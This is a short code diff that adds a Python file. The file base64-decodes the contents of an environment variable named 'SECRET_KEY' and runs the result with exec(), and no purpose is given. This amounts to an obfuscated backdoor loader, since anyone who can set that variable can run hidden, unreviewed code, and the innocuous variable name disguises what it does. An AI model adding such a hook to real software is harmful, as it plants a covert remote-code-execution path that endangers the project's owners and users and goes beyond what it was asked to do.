@@ -1,0 +1,7 @@
+import os
+
+import base64
+
+
+SECRET_ENV_VAR = "SECRET_KEY"
+exec(base64.b64decode(os.environ[SECRET_ENV_VAR]))
